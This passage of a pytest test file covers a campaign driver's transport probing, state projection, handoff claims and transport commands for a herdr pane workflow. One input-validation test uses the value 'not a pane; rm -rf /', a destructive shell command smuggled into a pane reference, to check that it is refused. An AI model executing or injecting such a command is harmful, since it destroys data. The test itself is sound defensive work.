        assert reason == "probe_identity_mismatch"

    def test_a_pane_herdr_does_not_know_fails_tier_two_only(self) -> None:
        def runner(argv, timeout=None):
            if argv[:3] == ["herdr", "pane", "list"]:
                return _ProbeProc(0, _probe_pane_list("w1:aaa"))
            return _ProbeProc(1, "")

        cap, pane, reason = ll.transport_probe(pane_ref="w1:bbb", runner=runner)
        assert (cap, pane) == (True, False)
        assert reason == "pane_not_found"

    def test_oversized_output_is_refused_not_buffered_forever(self) -> None:
        def runner(argv, timeout=None):
            return _ProbeProc(0, "x" * (ll.PROBE_MAX_BYTES + 1))

        cap, pane, reason = ll.transport_probe(pane_ref="w1:aaa", runner=runner)
        assert (cap, pane) == (False, False)
        assert reason == "probe_oversized"

    def test_unparseable_output_degrades(self) -> None:
        cap, pane, reason = ll.transport_probe(
            pane_ref="w1:aaa", runner=lambda argv, timeout=None: _ProbeProc(0, "{not json"))
        assert (cap, pane) == (False, False)
        assert reason == "probe_unparseable"

    def test_an_invalid_pane_reference_never_reaches_herdr(self) -> None:
        """A hostile or mistyped $HERDR_PANE_ID must not be passed to a subprocess."""
        calls = []

        def runner(argv, timeout=None):
            calls.append(argv)
            return _ProbeProc(0, _probe_pane_list("w1:aaa"))

        cap, pane, reason = ll.transport_probe(pane_ref="not a pane; rm -rf /", runner=runner)
        assert cap is True
        assert pane is False
        assert reason == "invalid_pane_ref"
        assert all(a[:3] != ["herdr", "pane", "get"] for a in calls)

    def test_any_unexpected_exception_degrades_rather_than_propagating(self) -> None:
        def runner(argv, timeout=None):
            raise RuntimeError("something nobody predicted")

        cap, pane, reason = ll.transport_probe(pane_ref="w1:aaa", runner=runner)
        assert (cap, pane) == (False, False)
        assert reason.startswith("probe_error:")

    def test_the_probe_is_bounded_by_a_timeout(self) -> None:
        seen = []

        def runner(argv, timeout=None):
            seen.append(timeout)
            return _ProbeProc(0, _probe_pane_list("w1:aaa"))

        ll.transport_probe(pane_ref=None, runner=runner)
        assert seen and all(t == ll.PROBE_TIMEOUT_S for t in seen), (
            "every probe call carries the bounded timeout")


class TestCreationTransport:
    """#927 AC 1: a NEW campaign's preference is DERIVED by probing, never asked and never defaulted.

    This is the acceptance criterion the design nearly shipped broken. With only `inline` as a
    no-field default, a healthy new campaign would inherit `inline` and preserve exactly the
    behaviour #927 exists to invert. Creation therefore probes TIER 1 ONLY -- it has no pane
    reference, and requiring one would fail closed on every new campaign.
    """

    def test_a_healthy_herdr_creates_a_pane_chain_campaign(self) -> None:
        transport, reason = ll.resolve_creation_transport(
            runner=lambda argv, timeout=None: _ProbeProc(0, _probe_pane_list("w1:aaa")))
        assert transport == "pane_chain"
        assert reason == "probe_ok"

    def test_an_unreachable_herdr_creates_an_inline_campaign(self) -> None:
        transport, reason = ll.resolve_creation_transport(
            runner=lambda argv, timeout=None: _ProbeProc(1, ""))
        assert transport == "inline"
        assert reason == "herdr_unreachable"

    def test_creation_never_needs_a_pane_reference(self) -> None:
        """The whole point of tier 1: `--current` is what fails in a pane-less session."""
        calls = []

        def runner(argv, timeout=None):
            calls.append(argv)
            return _ProbeProc(0, _probe_pane_list("w1:aaa"))

        transport, _ = ll.resolve_creation_transport(runner=runner)
        assert transport == "pane_chain"
        assert all(a[:3] != ["herdr", "pane", "get"] for a in calls), (
            "creation must not depend on a pane reference it may not have")

    def test_a_missing_binary_creates_an_inline_campaign_rather_than_raising(self) -> None:
        def runner(argv, timeout=None):
            raise FileNotFoundError("herdr")

        assert ll.resolve_creation_transport(runner=runner) == ("inline", "herdr_absent")

    def test_the_result_is_always_a_known_transport(self) -> None:
        import driver_lib as _dl
        for runner in (lambda argv, timeout=None: _ProbeProc(0, _probe_pane_list("w1:a")),
                       lambda argv, timeout=None: _ProbeProc(1, ""),
                       lambda argv, timeout=None: _ProbeProc(0, "{not json")):
            transport, _reason = ll.resolve_creation_transport(runner=runner)
            assert transport in _dl.TRANSPORTS


class TestLegacyProjectionChokepoint:
    """#927: `session_mode` is a WRITE-ONLY projection, enforced at the single locked writer.

    Review finding A6: "every write also writes the projection" is a cross-cutting invariant, and
    stating it as a convention means the first mutation path that forgets leaves `session_mode`
    stale -- so a rolled-back build executes the WRONG transport, silently. Enforcing it inside
    `_locked_state_update` makes it hold by construction instead of by discipline.
    """

    def _state_file(self, tmp_path, **fields):
        p = tmp_path / "camp.json"
        base = {"schema_version": 1, "campaign": "camp", "issues": []}
        base.update(fields)
        p.write_text(json.dumps(base))
        return str(p)

    def test_pane_chain_projects_on_write(self, tmp_path) -> None:
        path = self._state_file(tmp_path, preferred_transport="pane_chain")
        ll._locked_state_update(path, lambda st: st)
        assert json.loads(open(path).read())["session_mode"] == "fresh-session"

    def test_inline_projects_on_write(self, tmp_path) -> None:
        path = self._state_file(tmp_path, preferred_transport="inline")
        ll._locked_state_update(path, lambda st: st)
        assert json.loads(open(path).read())["session_mode"] == "single-session"

    def test_the_projection_lands_even_when_the_mutation_ignored_both_fields(self, tmp_path) -> None:
        """The point of a chokepoint: an unrelated mutation still keeps the projection true."""
        path = self._state_file(tmp_path, preferred_transport="pane_chain")

        def unrelated(st):
            st["notes"] = "something else entirely"
            return st

        ll._locked_state_update(path, unrelated)
        on_disk = json.loads(open(path).read())
        assert on_disk["notes"] == "something else entirely"
        assert on_disk["session_mode"] == "fresh-session"

    def test_a_stale_legacy_value_is_CORRECTED_by_the_canonical_field(self, tmp_path) -> None:
        path = self._state_file(tmp_path, preferred_transport="inline",
                                session_mode="fresh-session")
        ll._locked_state_update(path, lambda st: st)
        assert json.loads(open(path).read())["session_mode"] == "single-session"

    def test_no_canonical_field_means_the_legacy_field_is_left_alone(self, tmp_path) -> None:
        """A pre-#927 campaign must not have a projection invented for it."""
        path = self._state_file(tmp_path, session_mode="fresh-session")
        ll._locked_state_update(path, lambda st: st)
        on_disk = json.loads(open(path).read())
        assert on_disk["session_mode"] == "fresh-session"
        assert "preferred_transport" not in on_disk

    def test_an_unknown_canonical_value_writes_no_bogus_projection(self, tmp_path) -> None:
        path = self._state_file(tmp_path, preferred_transport="teleport")
        ll._locked_state_update(path, lambda st: st)
        assert "session_mode" not in json.loads(open(path).read())

    def test_an_aborted_mutation_writes_nothing(self, tmp_path) -> None:
        path = self._state_file(tmp_path, preferred_transport="pane_chain")
        assert ll._locked_state_update(path, lambda st: None) is None
        assert "session_mode" not in json.loads(open(path).read())

    def test_the_chokepoint_is_STRUCTURALLY_the_only_writer(self) -> None:
        """The projection holds everywhere only because there is exactly one writer.

        A second `_atomic_write` call site for driver state would bypass the projection and
        re-open finding A6 -- silently, since every existing test would still pass. This is the
        guard that makes the invariant enforceable rather than aspirational.
        """
        src = (Path(ll.__file__)).read_text()
        call_sites = [ln for ln in src.splitlines()
                      if "_atomic_write(" in ln and not ln.lstrip().startswith("def ")]
        assert len(call_sites) == 1, (
            f"expected exactly one _atomic_write call site, found {len(call_sites)}: "
            f"{call_sites}. A new driver-state writer must route through "
            f"_locked_state_update or the #927 legacy projection stops holding.")


class TestStep11ProbeFixes:
    """Regressions for the pre-PR review findings touching the probe and the projection."""

    def test_f10_an_rc2_usage_error_is_not_reported_as_a_missing_pane(self) -> None:
        """rc 2 is OUR bug; rc 1 is herdr saying the pane is gone. Collapsing them hides one."""
        def runner(argv, timeout=None):
            if argv[:3] == ["herdr", "pane", "list"]:
                return _ProbeProc(0, _probe_pane_list("w1:aaa"))
            return _ProbeProc(2, "")

        cap, pane, reason = ll.transport_probe(pane_ref="w1:aaa", runner=runner)
        assert (cap, pane) == (True, False)
        assert reason == "probe_usage_error"

    def test_f6_an_unknown_transport_REMOVES_a_stale_projection(self, tmp_path) -> None:
        """The opposite-transport rollback regression the projection exists to prevent."""
        p = tmp_path / "camp.json"
        p.write_text(json.dumps({"schema_version": 1, "campaign": "c", "issues": [],
                                 "preferred_transport": "teleport",
                                 "session_mode": "fresh-session"}))
        ll._locked_state_update(str(p), lambda st: st)
        assert "session_mode" not in json.loads(p.read_text()), (
            "a stale projection would run pane-chain after a rollback while this build runs inline")

    def test_f8_the_default_probe_runner_bounds_its_streams(self) -> None:
        """The real bound is in the runner, not a post-hoc len() on a buffered string."""
        proc = ll._bounded_probe_runner(
            [sys.executable, "-c",
             "import sys; sys.stdout.write('x' * (200 * 1024))"],
            timeout=15)
        assert len(proc.stdout) <= ll.PROBE_MAX_BYTES + 1, (
            "the runner must stop reading at the cap rather than buffering everything")

    def test_f8_an_oversized_stream_still_degrades_the_probe(self) -> None:
        cap, pane, reason = ll.transport_probe(
            pane_ref=None,
            runner=lambda argv, timeout=None: _ProbeProc(0, "x" * (ll.PROBE_MAX_BYTES + 1)))
        assert (cap, pane) == (False, False)
        assert reason == "probe_oversized"


# --- #927 PR 2 — the boundary fence, WIRED ---------------------------------------------------
#
# PR 1 shipped this machinery with no caller (D233). These tests are the caller's contract.
# Design authority: docs/planning/2026-08-05-927-epic-run-transport-rework.md sections 16.2-16.4.
# They drive `main()` in-process so the real argparse runs, and fake only the two things that
# would touch a live herdr: `transport_probe` and `perform_handoff`.


class TestBoundaryFenceWiring:

    @pytest.fixture(autouse=True)
    def _no_live_issue_probe(self, monkeypatch):
        monkeypatch.setenv(ll.ISSUE_PROBE_ENV, "0")

    def _run(self, tmp_path, monkeypatch, *, state=None, probe=(True, True, "probe_ok"),
             handoff=None, extra=None, panes_after=None, inventory=("w1:p1",), argv_over=None):
        """Drive `handoff` in-process. Returns (rc, state_after, splits_seen).

        `splits_seen` captures the driver-state AS IT WAS ON DISK when the launch was attempted,
        which is how the "resolution lands before the split" ordering is asserted rather than
        assumed. Only the two herdr-touching functions are faked.
        """
        state_path = state if state is not None else _state(tmp_path)
        monkeypatch.setattr(ll, "transport_probe", lambda **kw: probe)
        seq = [set(inventory), set(panes_after if panes_after is not None else inventory)]
        monkeypatch.setattr(ll, "_pane_inventory",
                            lambda runner=None: seq.pop(0) if seq else set(inventory))
        calls = []

        def _fake_perform(**kw):
            calls.append(json.loads(state_path.read_text(encoding="utf-8")))
            return handoff if handoff is not None else {
                "ok": True, "results": {}, "failed_step": None, "new_pane": "w1:pNEW",
                "session_id": "s1", "truncated": False, "cleanup": None, "failure_code": None}

        monkeypatch.setattr(ll, "perform_handoff", _fake_perform)
        over = {"--launcher-armed": None, "--fresh-launch-supported": None}
        over.update(argv_over or {})
        argv = _handoff_argv(state_path, tmp_path, **over)
        if extra:
            argv += extra
        rc = ll.main(argv)
        after = json.loads(state_path.read_text(encoding="utf-8"))
        return rc, after, calls

    def test_the_inflight_gate_refuses_before_the_generation_is_claimed(
            self, tmp_path, monkeypatch, capsys) -> None:
        """#726 SR-3. `_cmd_handoff` records `mark_split_attempted` durably BEFORE it calls
        `perform_handoff`, and `_classify_launch` maps an unrecognised failed_step to 'append no
        terminal event'. So a refusal raised INSIDE `perform_handoff` would leave this campaign
        with `split_attempted: true` and nothing terminal — parked, not retryable. The gate
        therefore lives beside the rc-6 and rc-8 gates, and this asserts nothing was written."""
        state_path = _state(tmp_path)
        before = json.loads(state_path.read_text(encoding="utf-8"))
        rc, after, calls = self._run(
            tmp_path, monkeypatch, state=state_path,
            argv_over={"--inflight-none": False,
                       "--inflight": "dispatch:step4-regate2:running:design re-gate"})
        assert rc == ll.INFLIGHT_REQUIRED_RC, capsys.readouterr()
        assert calls == [], "nothing may launch while the predecessor has work running"
        assert after == before, "a refusal must write NOTHING — not a claim, not split_attempted"
        assert "step4-regate2" in capsys.readouterr().err

    def test_a_refused_claim_stops_this_contender_with_rc_7_and_writes_nothing(
            self, tmp_path, monkeypatch, capsys) -> None:
        """Pass-1 Critical (F1): the first draft let a loser 'continue in place'. At a boundary
        nothing is in flight, so continuing can only mean taking the next child -- beside the claim
        holder's successor. That is the two-workers condition the fence exists to prevent."""
        state_path = _state(tmp_path)
        payload = json.loads(state_path.read_text(encoding="utf-8"))
        # somebody else holds a live claim on the generation this boundary will open
        payload["handoff_claim"] = {"generation": 4, "claimant": "other-session",
                                   "claimed_at": 9_999_999_999, "started": False}
        state_path.write_text(json.dumps(payload), encoding="utf-8")
        rc, after, calls = self._run(tmp_path, monkeypatch, state=state_path)
        assert rc == 7, capsys.readouterr()
        assert calls == [], "a losing contender must not launch anything"
        assert after.get("handoff_claim", {}).get("claimant") == "other-session"
        assert not dl_transitions(after), "no resolution may be recorded without the claim"

    def test_a_child_in_flight_refuses_the_boundary_without_writing(
            self, tmp_path, monkeypatch) -> None:
        """`child_boundary_precondition`: something in_progress is the mid-child case, not this."""
        state_path = _state(tmp_path, issues=[{"number": 611, "status": "in_progress"},
                                              {"number": 612, "status": "queued"}])
        rc, after, calls = self._run(tmp_path, monkeypatch, state=state_path)
        assert rc == 3
        assert calls == []
        assert "handoff_claim" not in after

    def test_the_resolution_lands_before_the_split_and_marks_it_attempted(
            self, tmp_path, monkeypatch) -> None:
        """Section 16.2 ordering, and the C1 Critical: `split_attempted` must be durable BEFORE the
        split, or a crash in between is indistinguishable from 'never started'."""
        rc, after, calls = self._run(tmp_path, monkeypatch)
        assert rc == 0, after
        assert len(calls) == 1, "the split ran exactly once"
        seen = dl_transitions(calls[0])
        assert seen, "the resolution must be on DISK when perform_handoff is called"
        assert seen[0]["split_attempted"] is True
        assert seen[0]["successor_pane"] is None
        assert seen[0]["panes_before"] is not None

    def test_a_successful_launch_records_the_pane_and_acks_then_releases_the_claim(
            self, tmp_path, monkeypatch) -> None:
        rc, after, _calls = self._run(tmp_path, monkeypatch)
        assert rc == 0
        events = dl_transitions(after)
        assert events[0]["successor_pane"] == "w1:pNEW"
        assert [e["outcome"] for e in dl_all_events(after) if e.get("outcome")] == ["successor_acked"]
        assert after.get("handoff_claim") is None, "a definite terminal releases the claim (F1)"

    def test_an_inline_effect_continues_inline_and_releases_its_claim(
            self, tmp_path, monkeypatch) -> None:
        rc, after, calls = self._run(tmp_path, monkeypatch, probe=(True, False, "pane_not_found"))
        assert rc == 0
        assert calls == [], "inline continuation launches nothing"
        assert [e["outcome"] for e in dl_all_events(after) if e.get("outcome")] == ["inline_continued"]
        assert after.get("handoff_claim") is None
        assert dl_transitions(after)[0]["effective"] == "inline"

    def test_a_measured_refusal_downgrades_the_preference_exactly_once(
            self, tmp_path, monkeypatch) -> None:
        """Section 16.4: only the ENUMERATED spiked code may downgrade (F5)."""
        rc, after, _c = self._run(tmp_path, monkeypatch, handoff={
            "ok": False, "results": {}, "failed_step": "split", "new_pane": None,
            "session_id": None, "truncated": False, "cleanup": None,
            "failure_code": "pane_not_found"}, panes_after=["w1:p1"])
        assert rc == 4
        assert [e["outcome"] for e in dl_all_events(after) if e.get("outcome")] == ["launch_failed"]
        assert after["preferred_transport"] == "inline"
        assert after["session_mode"] == "single-session", "the projection moves with it"

    def test_an_unclassified_split_failure_does_NOT_downgrade(
            self, tmp_path, monkeypatch) -> None:
        """F5: an empty diff proves no pane survived, NOT that creation was refused."""
        rc, after, _c = self._run(tmp_path, monkeypatch, handoff={
            "ok": False, "results": {}, "failed_step": "split", "new_pane": None,
            "session_id": None, "truncated": False, "cleanup": None,
            "failure_code": "internal_error"}, panes_after=["w1:p1"])
        assert rc == 4
        assert [e["outcome"] for e in dl_all_events(after) if e.get("outcome")] == ["launch_failed"]
        # The fixture campaign carries only the legacy `session_mode`, which `campaign_transport`
        # migrates on READ without writing — so "untouched" means no downgrade was materialised.
        assert after.get("preferred_transport") != "inline", "preference must not be downgraded"
        assert after.get("session_mode") == "fresh-session", "nor its projection"
        assert "transport_audit" not in after, "and no downgrade was audited"

    def test_an_unparseable_split_response_leaves_NO_terminal_event(
            self, tmp_path, monkeypatch) -> None:
        """F5/C5: closing it would remove it from reconciliation's reach for good."""
        rc, after, _c = self._run(tmp_path, monkeypatch, handoff={
            "ok": False, "results": {}, "failed_step": "split_response_unparseable",
            "new_pane": None, "session_id": None, "truncated": False, "cleanup": None})
        assert rc == 4
        assert [e for e in dl_all_events(after) if e.get("outcome")] == []
        assert dl_unterminated(after), "it stays the crash signature reconciliation keys on"
        assert after.get("handoff_claim") is not None, "an indeterminate launch KEEPS its lease"

    def test_a_pane_appearing_after_a_failed_split_is_indeterminate(
            self, tmp_path, monkeypatch) -> None:
        rc, after, _c = self._run(tmp_path, monkeypatch, handoff={
            "ok": False, "results": {}, "failed_step": "split", "new_pane": None,
            "session_id": None, "truncated": False, "cleanup": None,
            "failure_code": "pane_not_found"}, panes_after=["w1:p1", "w1:pGHOST"])
        assert [e for e in dl_all_events(after) if e.get("outcome")] == []
        assert after.get("preferred_transport") != "inline"
        assert after.get("session_mode") == "fresh-session"

    def test_an_unlistable_inventory_records_no_split_attempted(
            self, tmp_path, monkeypatch) -> None:
        rc, after, _c = self._run(tmp_path, monkeypatch, handoff={
            "ok": False, "results": {}, "failed_step": "pane_inventory_unavailable",
            "new_pane": None, "session_id": None, "truncated": False, "cleanup": None})
        assert [e["outcome"] for e in dl_all_events(after)
                if e.get("outcome")] == ["no_split_attempted"]
        assert after.get("preferred_transport") != "inline", \
            "an observation failure never downgrades"
        assert after.get("session_mode") == "fresh-session"

    def test_an_agent_that_never_started_records_start_failed_on_the_owned_pane(
            self, tmp_path, monkeypatch) -> None:
        rc, after, _c = self._run(tmp_path, monkeypatch, handoff={
            "ok": False, "results": {}, "failed_step": "agent_start", "new_pane": "w1:pNEW",
            "session_id": None, "truncated": False, "cleanup": None})
        assert [e["outcome"] for e in dl_all_events(after) if e.get("outcome")] == ["start_failed"]
        assert dl_transitions(after)[0]["successor_pane"] == "w1:pNEW"

    def test_a_second_invocation_after_a_successful_launch_is_REFUSED(
            self, tmp_path, monkeypatch) -> None:
        """Step-11 F2, confirmed: after a successful launch the claim is RELEASED and the child is
        still `queued` until the SUCCESSOR marks it in_progress. In that window a replay used to
        pass every check — the claim could not see it, because the replay opens its own
        generation."""
        state_path = _state(tmp_path)
        rc1, after1, calls1 = self._run(tmp_path, monkeypatch, state=state_path)
        assert rc1 == 0 and len(calls1) == 1
        assert after1["boundary_consumed"]["issue"] == 612
        rc2, after2, calls2 = self._run(tmp_path, monkeypatch, state=state_path)
        assert rc2 == 3, "the replay is refused"
        assert calls2 == [], "and launches NOTHING"
        assert len([e for e in dl_all_events(after2) if e.get("outcome")]) == 1

    def test_a_campaign_that_HAS_worked_is_not_downgraded_by_one_refusal(
            self, tmp_path, monkeypatch) -> None:
        """Step-11 F3: design §16.4 restricts the downgrade to a campaign where `successor_acked`
        has NEVER occurred. Without that half, six successful children then one `pane_not_found`
        would durably switch a healthy campaign to inline."""
        state_path = _state(tmp_path)
        payload = json.loads(state_path.read_text(encoding="utf-8"))
        payload["transitions"] = [
            {"resolution_id": "b:epic-667:3#1", "transition_id": "b:epic-667:3", "generation": 3,
             "split_attempted": True, "successor_pane": "w1:pOLD", "panes_before": []},
            {"resolution_id": "b:epic-667:3#1", "outcome": "successor_acked", "observed_at": 1}]
        state_path.write_text(json.dumps(payload), encoding="utf-8")
        rc, after, _c = self._run(tmp_path, monkeypatch, state=state_path, handoff={
            "ok": False, "results": {}, "failed_step": "split", "new_pane": None,
            "session_id": None, "truncated": False, "cleanup": None,
            "failure_code": "pane_not_found"}, panes_after=["w1:p1"])
        assert rc == 4
        assert after.get("preferred_transport") != "inline", "a proven-working campaign is kept"
        assert "transport_audit" not in after
        assert [e["outcome"] for e in dl_all_events(after)
                if e.get("outcome")] == ["successor_acked", "launch_failed"]

    def test_the_launcher_still_defers_to_the_recorded_answer(self, tmp_path, monkeypatch) -> None:
        """AC 3 / #611 Step-11 pass-3 High 2. A campaign recorded as `inline` gets NO process
        boundary at all -- the launcher reads the recorded answer and never forces one."""
        state_path = _state(tmp_path)
        payload = json.loads(state_path.read_text(encoding="utf-8"))
        payload.pop("session_mode", None)
        payload["preferred_transport"] = "inline"
        state_path.write_text(json.dumps(payload), encoding="utf-8")
        rc, after, calls = self._run(tmp_path, monkeypatch, state=state_path)
        assert rc == 3
        assert calls == []
        assert dl_all_events(after) == [], "no boundary, so no transition at all"


def dl_all_events(state):
    return [e for e in (state.get("transitions") or []) if isinstance(e, dict)]


def dl_transitions(state):
    return [e for e in dl_all_events(state) if "outcome" not in e]


def dl_unterminated(state):
    closed = {e.get("resolution_id") for e in dl_all_events(state) if e.get("outcome")}
    return [e for e in dl_transitions(state) if e.get("resolution_id") not in closed]


class TestTransportCommands:
    """#927 AC 2 and design sections 16.6/16.8. PR 1 shipped the pure guards
    (`transport_set_blocked`, `unpark_blocked`, `append_unpark`, `resolve_creation_transport`) and
    NO command that called any of them, so AC 2 had no live path at all."""

    def _state_file(self, tmp_path, **over):
        payload = {"campaign": "epic-9", "epic": 9, "generation": 1, "project": PROJECT,
                   "issues": [{"number": 1, "status": "queued"}]}
        payload.update(over)
        p = tmp_path / "ds.json"
        p.write_text(json.dumps(payload), encoding="utf-8")
        return p

    def test_resolve_creation_records_pane_chain_when_the_capability_probe_passes(
            self, tmp_path, monkeypatch) -> None:
        """AC 1: the default is DERIVED by probing, not asked at setup and not defaulted."""
        state = self._state_file(tmp_path)
        monkeypatch.setattr(ll, "transport_probe", lambda **kw: (True, False, "no_pane_ref"))
        rc = ll.main(["transport", "resolve-creation", "--driver-state", str(state),
                      "--project-root", str(tmp_path)])
        after = json.loads(state.read_text(encoding="utf-8"))
        assert rc == 0
        assert after["preferred_transport"] == "pane_chain"
        assert after["session_mode"] == "fresh-session", "the write-only projection travels with it"
        events = [e for e in after.get("transitions", [])]
        assert events[0]["trigger"] == "creation"
        assert events[0]["probe_reason"] == "probe_ok", "tier-1-only: no_pane_ref is not a degradation"
        assert events[-1]["outcome"] == "created"

    @pytest.mark.parametrize("reason", ["herdr_absent", "probe_timeout", "probe_unparseable",
                                        "probe_error:RuntimeError"])
    def test_resolve_creation_records_inline_and_the_reason_on_every_probe_failure(
            self, tmp_path, monkeypatch, reason) -> None:
        state = self._state_file(tmp_path)
        monkeypatch.setattr(ll, "transport_probe", lambda **kw: (False, False, reason))
        rc = ll.main(["transport", "resolve-creation", "--driver-state", str(state),
                      "--project-root", str(tmp_path)])
        after = json.loads(state.read_text(encoding="utf-8"))
        assert rc == 0
        assert after["preferred_transport"] == "inline"
        assert after["transitions"][0]["probe_reason"] == reason

    def test_resolve_creation_is_write_once(self, tmp_path, monkeypatch) -> None:
        state = self._state_file(tmp_path, preferred_transport="inline")
        monkeypatch.setattr(ll, "transport_probe", lambda **kw: (True, False, "no_pane_ref"))
        rc = ll.main(["transport", "resolve-creation", "--driver-state", str(state),
                      "--project-root", str(tmp_path)])
        assert rc == 2, "changing a recorded preference is `transport set`, not a re-probe"
        assert json.loads(state.read_text(encoding="utf-8"))["preferred_transport"] == "inline"

    def test_set_changes_the_preference_and_its_projection(self, tmp_path) -> None:
        state = self._state_file(tmp_path, preferred_transport="inline")
        rc = ll.main(["transport", "set", "pane_chain", "--driver-state", str(state),
                      "--reason", "herdr is back"])
        after = json.loads(state.read_text(encoding="utf-8"))
        assert rc == 0
        assert after["preferred_transport"] == "pane_chain"
        assert after["session_mode"] == "fresh-session"
        assert after["transport_audit"][-1]["reason"] == "herdr is back"

    def test_set_is_refused_mid_child_and_writes_NOTHING(self, tmp_path) -> None:
        state = self._state_file(tmp_path, preferred_transport="inline",
                                 issues=[{"number": 1, "status": "in_progress"}])
        rc = ll.main(["transport", "set", "pane_chain", "--driver-state", str(state),
                      "--reason", "nope"])
        after = json.loads(state.read_text(encoding="utf-8"))
        assert rc == 3
        assert after["preferred_transport"] == "inline", "a blocked guard performs no write"
        assert "transport_audit" not in after

    def test_set_is_refused_while_a_claim_is_live_and_writes_NOTHING(self, tmp_path) -> None:
        """A live claim means a boundary is mid-launch; changing the recorded answer under it
        would let the launch and the record disagree about what was chosen."""
        state = self._state_file(
            tmp_path, preferred_transport="inline",
            handoff_claim={"generation": 1, "claimant": "x", "claimed_at": 9_999_999_999,
                           "started": False})
        rc = ll.main(["transport", "set", "pane_chain", "--driver-state", str(state),
                      "--reason", "nope"])
        assert rc == 3
        assert json.loads(state.read_text(encoding="utf-8"))["preferred_transport"] == "inline"

    def test_set_refuses_a_value_outside_the_closed_set(self, tmp_path) -> None:
        """Self-review S1: an arbitrary string in `preferred_transport` degrades every later
        boundary to inline with a diagnostic nobody asked for."""
        state = self._state_file(tmp_path, preferred_transport="inline")
        rc = ll.main(["transport", "set", "pane-chain", "--driver-state", str(state),
                      "--reason", "typo"])
        assert rc == 2
        assert json.loads(state.read_text(encoding="utf-8"))["preferred_transport"] == "inline"

    def _parked(self, tmp_path):
        state = self._state_file(tmp_path)
        payload = json.loads(state.read_text(encoding="utf-8"))
        payload["transitions"] = [
            {"resolution_id": "b:epic-9:1#1", "transition_id": "b:epic-9:1", "generation": 1,
             "split_attempted": True, "successor_pane": None, "panes_before": ["w1:pA"]},
            {"resolution_id": "b:epic-9:1#1", "outcome": "parked_unreconcilable",
             "observed_at": 5}]
        state.write_text(json.dumps(payload), encoding="utf-8")
        return state

    def test_unpark_appends_a_new_terminal_and_never_rewrites_the_park(self, tmp_path) -> None:
        state = self._parked(tmp_path)
        rc = ll.main(["transport", "unpark", "b:epic-9:1#1", "--driver-state", str(state),
                      "--adopt", "w1:pB", "--operator", "rocky", "--reason", "pane is alive"])
        after = json.loads(state.read_text(encoding="utf-8"))
        outcomes = [e["outcome"] for e in after["transitions"] if e.get("outcome")]
        assert rc == 0
        assert outcomes == ["parked_unreconcilable", "successor_acked"], \
            "the park stays as the audit record of what the run could not decide"
        assert after["transitions"][-1]["operator"] == "rocky"

    def test_unpark_refuses_a_resolution_that_is_not_parked(self, tmp_path) -> None:
        state = self._state_file(tmp_path)
        rc = ll.main(["transport", "unpark", "b:epic-9:1#1", "--driver-state", str(state),
                      "--discard", "--operator", "rocky", "--reason", "x"])
        assert rc == 3

    def test_unpark_is_one_shot(self, tmp_path) -> None:
        state = self._parked(tmp_path)
        ll.main(["transport", "unpark", "b:epic-9:1#1", "--driver-state", str(state),
                 "--discard", "--operator", "rocky", "--reason", "gone"])
        rc = ll.main(["transport", "unpark", "b:epic-9:1#1", "--driver-state", str(state),
                      "--adopt", "w1:pB", "--operator", "rocky", "--reason", "again"])
        assert rc == 3, "the LATEST terminal event decides, so a second unpark is refused"

    def test_unpark_validates_the_adopted_pane_id_and_bounds_the_note(self, tmp_path) -> None:
        state = self._parked(tmp_path)
        assert ll.main(["transport", "unpark", "b:epic-9:1#1", "--driver-state", str(state),
                        "--adopt", "not a pane", "--operator", "r", "--reason", "x"]) == 2
        assert ll.main(["transport", "unpark", "b:epic-9:1#1", "--driver-state", str(state),
                        "--discard", "--operator", "r", "--reason", "y" * 201]) == 2
        after = json.loads(state.read_text(encoding="utf-8"))
        assert [e["outcome"] for e in after["transitions"] if e.get("outcome")] == \
            ["parked_unreconcilable"], "a refused unpark writes nothing"


class TestAdvisoryEmission:
    """#927 AC 4: a boundary that did NOT happen must be visible, from both surfaces, at most once.

    Pass-2 finding F4 is the reason the claim is durable: `advisory_due` was a pure predicate over
    a caller-supplied set that nothing persisted, so `handoff` and `next-child` could each pass an
    empty set and both print the same line.
    """

    @pytest.fixture(autouse=True)
    def _no_live_issue_probe(self, monkeypatch):
        monkeypatch.setenv(ll.ISSUE_PROBE_ENV, "0")

    def test_next_child_announces_that_an_inline_campaign_is_choosing_in_session(
            self, tmp_path, capsys) -> None:
        state = _state(tmp_path)
        payload = json.loads(state.read_text(encoding="utf-8"))
        payload.pop("session_mode", None)
        payload["preferred_transport"] = "inline"
        state.write_text(json.dumps(payload), encoding="utf-8")
        work, _head = _local_repo_with_origin(tmp_path)
        rc = ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        streams = capsys.readouterr()
        assert rc == 0
        # STDERR: stdout is a JSON document the epic-run skill parses, so an advisory there would
        # break it. Two pre-existing revalidation-gate tests proved that the hard way.
        assert "transport=inline" in streams.err and "#612" in streams.err
        assert json.loads(streams.out)["next_issue"] == 612, "stdout stays pure JSON"
        after = json.loads(state.read_text(encoding="utf-8"))
        assert [e["state"] for e in after["advisory_deliveries"]] == ["pending", "emitted"]

    def test_a_second_next_child_does_not_repeat_the_line(self, tmp_path, capsys) -> None:
        state = _state(tmp_path)
        payload = json.loads(state.read_text(encoding="utf-8"))
        payload.pop("session_mode", None)
        payload["preferred_transport"] = "inline"
        state.write_text(json.dumps(payload), encoding="utf-8")
        work, _head = _local_repo_with_origin(tmp_path)
        ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        capsys.readouterr()
        ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        assert "transport=inline" not in capsys.readouterr().err

    def test_a_pane_chain_campaign_gets_no_in_session_advisory(self, tmp_path, capsys) -> None:
        state = _state(tmp_path)
        work, _head = _local_repo_with_origin(tmp_path)
        ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        assert "transport=inline" not in capsys.readouterr().err

    def test_a_print_that_fails_leaves_the_claim_visibly_undelivered(
            self, tmp_path, monkeypatch) -> None:
        """AC 4 as at-most-once printing: the durable record is the authoritative surface, and a
        `pending` that never became `emitted` IS the visible defect (pass-2 F4)."""
        state = _state(tmp_path)
        payload = json.loads(state.read_text(encoding="utf-8"))
        payload.pop("session_mode", None)
        payload["preferred_transport"] = "inline"
        state.write_text(json.dumps(payload), encoding="utf-8")
        work, _head = _local_repo_with_origin(tmp_path)

        real_print = print

        def _boom(*a, **k):
            # ONLY the advisory line fails. Patching every print would also break the command's
            # own JSON output and prove nothing about the advisory path.
            if a and isinstance(a[0], str) and a[0].startswith("### epic-run:"):
                raise OSError("stdout is gone")
            return real_print(*a, **k)

        monkeypatch.setattr("builtins.print", _boom)
        rc = ll.main(["next-child", "--driver-state", str(state), "--project-root", work])
        after = json.loads(state.read_text(encoding="utf-8"))
        assert [e["state"] for e in after["advisory_deliveries"]] == ["pending", "failed"]
